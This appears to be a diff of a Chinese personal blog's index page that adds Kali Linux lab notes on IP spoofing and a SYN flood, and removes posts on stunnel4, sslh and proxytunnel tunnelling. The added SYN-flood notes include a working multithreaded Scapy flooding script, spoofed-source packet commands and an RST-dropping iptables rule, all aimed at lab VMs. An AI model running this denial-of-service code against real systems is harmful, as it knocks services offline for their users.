+<li>i.dst=”网关的IP地址” </li>
+<li>p=ICMP() </li>
+<li>p.display() </li>
+<li>send(i/p)</li>
+</ul>
+</li>
+<li>▲ send(IP(dst=”网关IP地址”,src=”Metasploit的IP地址”)/ICMP(),count=100,verbose=1)</li>
+</ul>
+</li>
+<li>Metasploit（被攻击者）<ul>
+<li><strong><code>🔺命令：sudo tcpdump -i eth0</code></strong>（进行数据包抓取）</li>
+<li>查看局域网内是否有机器对伪造的源地址进行回应</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B9%9D)%EF%BC%9ASyn-Flood/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%B9%9D)%EF%BC%9ASyn-Flood/" itemprop="url">Kali Linux笔记(七十九)：Syn-Flood</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:23:36+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  727 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Syn-Flood"><a href="#1-Syn-Flood" class="headerlink" title="1. Syn-Flood"></a>1. Syn-Flood</h4><ul>
+<li>常伴随IP欺骗<ul>
+<li>真正的攻击目标</li>
+</ul>
+</li>
+<li>Scapy<ul>
+<li>i=IP()</li>
+<li>i.dst=1.1.1.1</li>
+<li>i.display()</li>
+<li>t=TCP()</li>
+<li>sr1(i/t,verbose=1,timeout=3)</li>
+<li>sr1(IP(dst=1.1.1.1)/TCP())</li>
+</ul>
+</li>
+<li>▲ 占去服务器最大的TCP连接方式，但不一定占满CPU和内存</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/Syn-Flood.PNG" alt="Syn-Flood"></p>
+<h4 id="2-实验–准备"><a href="#2-实验–准备" class="headerlink" title="2. 实验–准备"></a>2. 实验–准备</h4><ul>
+<li>Kali（攻击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Metasploit（Linux被攻击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+<li>Window XP SP3（Winodws被轰击者）<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-实验–Linux"><a href="#3-实验–Linux" class="headerlink" title="3. 实验–Linux"></a>3. 实验–Linux</h4><ul>
+<li>Metasploit（Linux被攻击者）<ul>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>查看开放的端口（TCP端口，<strong><code>🔺命令：netstat -pantu</code></strong>查看）</li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li>Scapy<ul>
+<li>i=IP()</li>
+<li>i.dst=”Metasploit的IP”</li>
+<li>i.display()</li>
+<li>t=TCP()</li>
+<li>t.dport=22</li>
+<li>t.display()（查看发包是否flags=S）</li>
+<li>sr1(i/t,verbose=1,timeout=3)（查看回包是否flags=SA）</li>
+</ul>
+</li>
+<li>▲ sr1(IP(dst=”Metasploit的IP”)/TCP())</li>
+<li>开启Wireshark开启抓包，重新发送数据包（ip add eq Metasploit的IP），RST数据包会让被攻击者丢弃建立的SYN/ACK数据包</li>
+<li><strong><code>🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Metasploit的IP -j DROP</code></strong></li>
+<li><strong><code>🔺命令：iptables -L</code></strong>进行查看目标是否生效</li>
+<li>重新发送数据包（ip add eq Metasploit的IP），看是否出现RST数据包，会出现一个TCP Retransmission重传数据包</li>
+<li>先连接<strong><code>🔺命令：ssh msfadmin@Metasploit的IP</code></strong>，尝试连接速度是否延迟</li>
+<li>攻击脚本：<strong><code>🔺命令：./syn_flood.py Metasploit的IP 22 200</code></strong></li>
+<li>在攻击的同时开启Wireshark抓包查看数据包，并ssh登陆看是否能登陆</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./syn_flood.py [IP端口] [端口] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./syn_flood.py 1.1.1.1 80 20&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">port = int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">print &quot;正在执行SYN Flood 攻击，按 Ctrl+C 停止攻击&quot;</span><br><span class="line">def synflood(target,port):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        x = random.randint(0,65535)</span><br><span class="line">        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)</span><br><span class="line"></span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(synflood,(target,port))</span><br><span class="line"></span><br><span class="line">while 0 == 0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Metasploit（Linux被攻击者）<ul>
+<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU和内存是否提高或者不变</li>
+<li>查看TCP连接：<strong><code>🔺命令：netstat -n | awk &#39;/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}&#39;</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="4-实验–Window"><a href="#4-实验–Window" class="headerlink" title="4. 实验–Window"></a>4. 实验–Window</h4><ul>
+<li>Window XP SP3（Winodws被攻击者）<ul>
+<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
+<li>关闭防火墙</li>
+<li>开启远程桌面，设置administrator密码（空密码不允许登陆）</li>
+</ul>
+</li>
+<li>Kali（攻击者）<ul>
+<li><strong><code>🔺命令：rdesktop</code></strong>尝试登陆，连接速度是否延迟</li>
+<li><strong><code>🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Window XP SP3的IP -j DROP</code></strong></li>
+<li><strong><code>🔺命令：iptables -L</code></strong>进行查看目标是否生效</li>
+<li>攻击脚本：<strong><code>🔺命令：./syn_flood.py Window XP SP3的IP 3389 10</code></strong></li>
+<li>在攻击的同时开启Wireshark抓包查看数据包，并rdesktop远程桌面登陆看是否能登陆</li>
+</ul>
+</li>
+<li>▲ Windows系统默认半开连接数10个</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AB)%EF%BC%9ATCP%E8%BF%9E%E6%8E%A5%E3%80%81IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -682,2503 +2747,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%B0%81%E8%A3%85TCP%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93--stunnel4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%B0%81%E8%A3%85TCP%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93--stunnel4/" itemprop="url">Kali Linux笔记(七十六)：封装TCP流量隧道--stunnel4</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T20:05:20+08:00">
-                2020-02-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  569 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-stunnel4"><a href="#1-stunnel4" class="headerlink" title="1. stunnel4"></a>1. stunnel4</h4><ul>
-<li>无需修改原代码的情况下将TCP流量封装于SSL通道内</li>
-<li>适用于本身不支持加密传输的应用</li>
-<li>支持openssl安全特性</li>
-<li>跨平台</li>
-<li>性能优</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/stunnel4.PNG" alt="stunnel4"></p>
-<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>bodhi（stunnel4 Server）<ul>
-<li>网卡方式为NAT方式，检查网络</li>
-</ul>
-</li>
-<li>metasploit（内网的应用服务器，mysql）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-</ul>
-</li>
-<li>bodhi（stunnel4 Server）<ul>
-<li><strong><code>🔺命令：apt-get install stunnel4</code></strong></li>
-<li>网卡方式修改为Host-only方式，检查网络</li>
-<li>浏览器访问mono防火墙</li>
-<li>编辑上一个小节的NAT规则<ul>
-<li>Protocol → TCP</li>
-<li>External port range → from:3306</li>
-<li>NAT IP → Metasploit的IP地址</li>
-<li>Local port → 3306</li>
-<li>保存更改的应用</li>
-</ul>
-</li>
-<li>编辑上一小节的Rules规则（WAN口）<ul>
-<li>Destination port range → from:other 3306/to:3306</li>
-<li>保存更改的应用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali（stunnel4 Client）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-<li>开启Wireshark抓包（ip.address=mono的WAN的IP）</li>
-<li><strong><code>🔺命令：mysql -u root -h mono的WAN的IP</code></strong></li>
-<li><strong><code>🔺命令：show databases;</code></strong></li>
-<li>▲ Wireshark的TCP Stream可以查看到为明文信息</li>
-</ul>
-</li>
-<li>bodhi（stunnel4 Server）<ul>
-<li>生成证书：<strong><code>🔺命令：openssl req -new –days 365 -nodes -x509 -out /etc/stunnel/ stunnel.pem -keyout /etc/stunnel/stunnel.pem</code></strong></li>
-<li>创建配置文件：/etc/stunnel/stunnel.conf<ul>
-<li>cert = /etc/stunnel/stunnel.pem </li>
-<li>setuid = stunnel4 </li>
-<li>setgid = stunnel4 </li>
-<li>pid = /var/run/stunnel4/stunnel4.pid </li>
-<li>[mysqls] </li>
-<li>accept  = 0.0.0.0:443</li>
-<li>connect = Metasploit的IP:3306</li>
-</ul>
-</li>
-<li>stunnel4自动启动<ul>
-<li>/etc/default/stunnel4 → ENABLED=1</li>
-</ul>
-</li>
-<li>启动stunnel4服务端<ul>
-<li><strong><code>🔺命令：service stunnel4 start</code></strong>（netstat -pantu进行查看是否开启）</li>
-</ul>
-</li>
-<li>浏览器登陆mono修改WAN的NAT<ul>
-<li>External port range → HTTPS/HTTPS</li>
-<li>NAT IP → bodhi的IP</li>
-<li>保存应用</li>
-</ul>
-</li>
-<li>浏览器登陆mono修改WAN的Rule规则<ul>
-<li>Destination → Address → bodhi的IP</li>
-<li>Destination port range → HTTPS/HTTPS</li>
-<li>保存应用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali（stunnel4 Client）<ul>
-<li>创建配置文件：/etc/stunnel/stunnel.conf<ul>
-<li>client = yes </li>
-<li>[mysqls]    </li>
-<li>accept = 3306  </li>
-<li>connect = mono的IP:443 </li>
-</ul>
-</li>
-<li>客户端自动启动<ul>
-<li>/etc/default/stunnel4 → ENABLED=1</li>
-</ul>
-</li>
-<li>启动stunnel4客户端<ul>
-<li><strong><code>🔺命令：service stunnel4 stop / start</code></strong>（netstat -pantu进行查看是否开启）</li>
-</ul>
-</li>
-<li>开启Wireshark抓包（ip.address=mono的IP）</li>
-<li><strong><code>🔺命令：mysql -u root -h 127.0.0.1</code></strong></li>
-<li><strong><code>🔺命令：show databases;</code></strong></li>
-<li>▲ Wireshark的TCP Stream可以查看到为加密信息</li>
-</ul>
-</li>
-<li>▲ 2020.2.3外网WAN访问防火墙WAN的IP，无法进行访问，进行ping防火墙WAN的IP也无法成功，猜测与防火墙规则有关，后面有关stunnel的实验都未作，猜测VMware自带网卡的问题</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%80%E7%AB%AF%E5%8F%A3%E5%A4%9A%E6%9C%8D%E5%8A%A1%E9%9A%A7%E9%81%93--sslh/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%80%E7%AB%AF%E5%8F%A3%E5%A4%9A%E6%9C%8D%E5%8A%A1%E9%9A%A7%E9%81%93--sslh/" itemprop="url">Kali Linux笔记(七十五)：一端口多服务隧道--sslh</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T20:02:26+08:00">
-                2020-02-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  906 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-sslh（ssl-ssh）"><a href="#1-sslh（ssl-ssh）" class="headerlink" title="1. sslh（ssl+ssh）"></a>1. sslh（ssl+ssh）</h4><ul>
-<li>端口分配器<ul>
-<li>根据客户端第一个包检测协议类型</li>
-<li>根据协议检测结果将流量转发给不同目标</li>
-<li>支持HTTP、HTTPS、SSH、OpenVPN、tinc、XMAPP和可基于正则表达式判断的人和协议类型</li>
-<li>适用于防火墙允许443端口入站访问流量的环境</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/sslh.PNG" alt="sslh"></p>
-<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
-<li>Mono防火墙<ul>
-<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
-</ul>
-</li>
-<li>Kali（SSLH）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-</ul>
-</li>
-<li>Window Server 2003（内网的CA服务器）<ul>
-<li>网卡方式为Host-only方式，检查网络</li>
-<li>安装web server<ul>
-<li>Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS → 万维网服务/Active Server Pages，可能需要光盘）</li>
-</ul>
-</li>
-<li>安装CA服务器<ul>
-<li>Win+R → appwiz.cpl → 更改或添加程序 → 证书服务 </li>
-<li>独立根CA类型、证书名称：LAB CA、有效期限</li>
-</ul>
-</li>
-<li>开始 → Internet信息服务（IIS）管理器<ul>
-<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
-<li>目录安全性 → 服务器证书 → 名称：<a href="http://www.lab.com、2048位长、单位：IT、部门：IT、公用名称：www.lab.com、国家/省市" target="_blank" rel="noopener">www.lab.com、2048位长、单位：IT、部门：IT、公用名称：www.lab.com、国家/省市</a> → 修改申请文件放置位置</li>
-<li>浏览器范围访问<a href="http://127.0.0.1/certsrv/" target="_blank" rel="noopener">http://127.0.0.1/certsrv/</a> → 申请证书 → 高级证书 → BASE64编码 → 粘贴证书服务器代码 → 提交</li>
-</ul>
-</li>
-<li>开始 → 证书服务器管理<ul>
-<li>LAB CA → 挂起的申请 → 选中申请的证书右键 → 所有任务 → 颁发</li>
-<li>证书可以在颁发的证书中查看详细信息</li>
-</ul>
-</li>
-<li>浏览器范围访问<a href="http://127.0.0.1/certsrv/" target="_blank" rel="noopener">http://127.0.0.1/certsrv/</a> → 查看挂起的证书申请状态 → 下载证书 → 保存在桌面 </li>
-<li>开始 → Internet信息服务（IIS）管理器<ul>
-<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
-<li>目录安全性 → 服务器证书 → 处理挂起的请求并安装证书 </li>
-<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
-<li>目录安全性 → 查看证书</li>
-<li>w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性</li>
-<li>目录安全性 → 编辑 → 要求安全通道（SSL）</li>
-<li>停止网站 → 重新启动</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Kali（SSLH）<ul>
-<li>浏览器访问<a href="https://Window" target="_blank" rel="noopener">https://Window</a> Server 2003的IP，看是否能通过SSL通道进行通信</li>
-<li>配置文件：<strong><code>🔺命令：vi /etc/default/sslh</code></strong><ul>
-<li>RUN=yes</li>
-<li>DAEMON=/usr/sbin/sslh</li>
-<li>DAEMON_OPTS=”–user sslh –listen 本机的IP:443 –ssh 127.0.0.1:22 –http 127.0.0.1:80  –ssl Window Server 2003的IP:443 –pidfile /var/run/sslh/sslh.pid”</li>
-</ul>
-</li>
-<li>启动apache服务，修改侦听端口<strong><code>🔺命令：vi /etc/apache2/ports.conf</code></strong> → 127.0.0.1:80，重启apache服务，<strong><code>🔺命令：netstat -pantu</code></strong>查看是否更改</li>
-<li>开启SSH服务（修改SSH配置文件）</li>
-</ul>
-</li>
-<li>Mono防火墙<ul>
-<li>浏览器访问mono防火墙</li>
-<li>新建NAT规则<ul>
-<li>Interface → WAN</li>
-<li>External address → Interface address（若为网段其他的IP映射，需设置为WAN address → Server NAT → 加入整个网段）</li>
-<li>Protocol → TCP</li>
-<li>External port range → HTTPS/HTTPS</li>
-<li>NAT IP → KALI的IP</li>
-<li>Auto-add a firewall rule to permit traffic through this NAT rule</li>
-</ul>
-</li>
-<li>保存应用，Rules的WAN口多出一条rule</li>
-</ul>
-</li>
-<li>Kali（SSLH）<ul>
-<li><strong><code>🔺命令：service sslh start</code></strong>（netstat -pantu进行查看）</li>
-<li>浏览器验证本机http是否正常进行</li>
-</ul>
-</li>
-<li>物理机<ul>
-<li>浏览器访问http://防火墙WAN的IP:443 → Kali的Web资源</li>
-<li>浏览器访问https://防火墙WAN的IP → Window Server 2003的Web资源</li>
-<li>ssh尝试登陆防火墙WAN的IP:443进行登陆</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：namp -p443 -sV -A 防火墙WAN的IP</code></strong><ul>
-<li>基本可以扫描出所有的服务</li>
-</ul>
-</li>
-<li>▲ 2020.2.3内网sslh代理正常，原因在于访问Kali IP三种方式都能代理，但外网WAN访问防火墙WAN的IP，无法进行访问，进行ping防火墙WAN的IP也无法成功，猜测与防火墙规则有关</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%9B%9B)%EF%BC%9AHTTP(S)%E9%9A%A7%E9%81%93--proxytunnel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%83%E5%8D%81%E5%9B%9B)%EF%BC%9AHTTP(S)%E9%9A%A7%E9%81%93--proxytunnel/" itemprop="url">Kali Linux笔记(七十四)：HTTP(S)隧道--proxyptunnel</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T19:55:27+08:00">
-                2020-02-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.2k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  4 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-proxytunnel"><a href="#1-proxytunnel" class="headerlink" title="1. proxytunnel"></a>1. proxytunnel</h4><ul>
-<li>通过标准的HTTP/HTTPS代理创建隧道的工具</li>
-<li>通过HTTP CONNECT方法封装信息</li>
-<li>适用于内网使用代理并且防火墙只允许代理服务器上网的场景</li>
-<li>无法创建DNS隧道和ICMP隧道</li>
-<li>侦听端口开在本地上，可以指定需要访问的资源，服务器</li>
-</ul>
-<p><img src="/images/kali/kali-notepad/proxytunnel.PNG" alt="proxytunnel"></p>
